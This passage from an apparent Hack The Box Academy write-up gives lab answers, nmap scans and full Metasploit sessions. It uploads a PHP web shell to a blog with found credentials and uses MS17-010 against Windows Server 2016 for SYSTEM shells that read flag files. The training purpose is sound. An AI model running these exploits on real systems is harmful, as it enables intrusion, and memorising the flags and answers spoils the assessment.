|   NetBIOS computer name: SHELLS-WINSVR\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-02-02T01:55:37-08:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:ac:d8 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h35m59s, deviation: 3h34m39s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.50 seconds
```

This one was solved with laudanum, just like section "Laudanum, One Webshell To Rule Them All"

**Answer:** `dev-share`

### Question 3:
![](./attachments/Pasted%20image%2020230201205250.png)
*Hint: Proper scanning prevents poor performance.....*

```
┌─[htb-student@skills-foothold]─[~]
└──╼ $sudo nmap -n -sV -sC blog.inlanefreight.local
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-02 04:52 EST
Nmap scan report for blog.inlanefreight.local (172.16.1.12)
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Inlanefreight Gabber
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 00:50:56:B9:6B:46 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

**Answer:** `ubuntu`

### Question 4:
![](./attachments/Pasted%20image%2020230201205400.png)
*Hint: Slade Wilson mentioned an interesting vulnerability in his public post. Perhaps that exploit is already on foothold....*

```

```

**Answer:** `php`

### Question 5:
![](./attachments/Pasted%20image%2020230201205420.png)
*Hint: The use command in msf may be useful....*

We found a post on the website talking about an exploit for the site.

![](./attachments/Pasted%20image%2020230202122820.png)

The exploit is available in metasploit.

```
┌─[htb-student@skills-foothold]─[~]
└──╼ $sudo msfconsole

[msf](Jobs:0 Agents:0) >> use 50064.rb
[*] Using configured payload php/meterpreter/bind_tcp
[msf](Jobs:0 Agents:0) exploit(50064) >> options

Module options (exploit/50064):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   demo             yes       Blog password
   Proxies                     no        A proxy chain of format type:host:por
                                         t[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identi
                                         fier, or hosts file with syntax 'file
                                         :<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connec
                                         tions
   TARGETURI  /                yes       The URI of the arkei gate
   USERNAME   demo             yes       Blog username
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   PHP payload

[msf](Jobs:0 Agents:0) exploit(50064) >> set RHOST 172.16.1.12
RHOST => 172.16.1.12
[msf](Jobs:0 Agents:0) exploit(50064) >> set USERNAME admin
USERNAME => admin
[msf](Jobs:0 Agents:0) exploit(50064) >> set PASSWORD admin123!@#
PASSWORD => admin123!@#
[msf](Jobs:0 Agents:0) exploit(50064) >> set VHOST blog.inlanefreight.local
VHOST => blog.inlanefreight.local
[msf](Jobs:0 Agents:0) exploit(50064) >> run

[*] Got CSRF token: 01c4e36ff0
[*] Logging into the blog...
[+] Successfully logged in with admin
[*] Uploading shell...
[+] Shell uploaded as data/i/41IK.php
[+] Payload successfully triggered !
[*] Started bind TCP handler against 172.16.1.12:4444
[*] Sending stage (39282 bytes) to 172.16.1.12
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.16.1.12:4444) at 2023-02-02 06:20:40 -0500

(Meterpreter 1)(/var/www/blog.inlanefreight.local/data/i) > shell
Process 2013 created.
Channel 0 created.
pwd
/var/www/blog.inlanefreight.local/data/i
cat /customscripts/flag.txt 
B1nD_Shells_r_cool
```

**Answer:** `B1nD_Shells_r_cool`

### Question 6:
![](./attachments/Pasted%20image%2020230201205430.png)
*Hint: It is always good to enumerate...*

```
┌─[htb-student@skills-foothold]─[~]
└──╼ $sudo nmap -n -sV -sC 172.16.1.13
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-02 06:30 EST
Nmap scan report for 172.16.1.13
Host is up (0.091s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 172.16.1.13 - /
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
MAC Address: 00:50:56:B9:E7:C2 (VMware)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h40m00s, deviation: 4h37m07s, median: 0s
|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:e7:c2 (VMware)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-02T11:30:45
|_  start_date: 2023-02-02T11:03:17
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-02-02T03:30:45-08:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.17 seconds
```

**Answer:** `SHELLS-WINBLUE`

### Question 7:
![](./attachments/Pasted%20image%2020230201205437.png)
*Hint: Take a close look at the enumeration results*

```
┌─[htb-student@skills-foothold]─[~]
└──╼ $sudo msfconsole

[msf](Jobs:0 Agents:0) >> search eternal

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

[msf](Jobs:0 Agents:0) >> use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name               Current Setting    Required  Description
   ----               ---------------    --------  -----------
   DBGTRACE           false              yes       Show extra debug trace info
   LEAKATTEMPTS       99                 yes       How many times to try to le
                                                   ak transaction
   NAMEDPIPE                             no        A named pipe that can be co
                                                   nnected to (leave blank for
                                                    auto)
   NAMED_PIPES        /usr/share/metasp  yes       List of named pipes to chec
                      loit-framework/da            k
                      ta/wordlists/name
                      d_pipes.txt
   RHOSTS                                yes       The target host(s), range C
                                                   IDR identifier, or hosts fi
                                                   le with syntax 'file:<path>
                                                   '
   RPORT              445                yes       The Target port (TCP)
   SERVICE_DESCRIPTI                     no        Service description to to b
   ON                                              e used on target for pretty
                                                    listing
   SERVICE_DISPLAY_N                     no        The service display name
   AME
   SERVICE_NAME                          no        The service name
   SHARE              ADMIN$             yes       The share to connect to, ca
                                                   n be an admin share (ADMIN$
                                                   ,C$,...) or a normal read/w
                                                   rite folder share
   SMBDomain          .                  no        The Windows domain to use f
                                                   or authentication
   SMBPass                               no        The password for the specif
                                                   ied username
   SMBUser                               no        The username to authenticat
                                                   e as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thr
                                        ead, process, none)
   LHOST     10.129.230.149   yes       The listen address (an interface may b
                                        e specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set RHOST 172.16.1.13
RHOST => 172.16.1.13
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LHOST 172.16.1.5
LHOST => 172.16.1.5
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> run

[*] Started reverse TCP handler on 172.16.1.5:4444 
[*] 172.16.1.13:445 - Target OS: Windows Server 2016 Standard 14393
[*] 172.16.1.13:445 - Built a write-what-where primitive...
[+] 172.16.1.13:445 - Overwrite complete... SYSTEM session obtained!
[*] 172.16.1.13:445 - Selecting PowerShell target
[*] 172.16.1.13:445 - Executing the payload...
[+] 172.16.1.13:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 172.16.1.13
[*] Meterpreter session 1 opened (172.16.1.5:4444 -> 172.16.1.13:49671) at 2023-02-02 06:35:10 -0500

(Meterpreter 1)(C:\Windows\system32) > shell
Process 4028 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type \Users\Administrator\Desktop\Skills-flag.txt 
type \Users\Administrator\Desktop\Skills-flag.txt 
One-H0st-Down!
```

**Answer:** `One-H0st-Down!`

---
**Tags:** [[Hack The Box Academy]]